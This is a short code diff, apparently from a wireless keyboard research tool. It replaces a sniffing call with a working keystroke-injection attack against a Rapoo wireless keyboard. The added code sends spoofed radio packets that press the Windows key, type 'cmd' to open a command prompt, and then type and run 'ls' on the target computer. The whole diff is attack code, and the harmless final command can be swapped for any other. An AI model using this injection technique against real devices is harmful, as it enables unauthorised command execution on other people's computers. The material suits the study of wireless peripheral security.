@@ -67,4 +67,19 @@ attack = [
 #tx_mouse.spoof(m)
 
 rapoo_Keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
-rapoo_Keyboard.sniff()
+
+attack = [
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
+    lambda: time.sleep(1),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_C]),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_M]),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_D]),
+    lambda: time.sleep(1),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
+    lambda: time.sleep(1.5),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_L]),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_S]),
+    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
+    ]
+
+rapoo_Keyboard.spoof(attack)
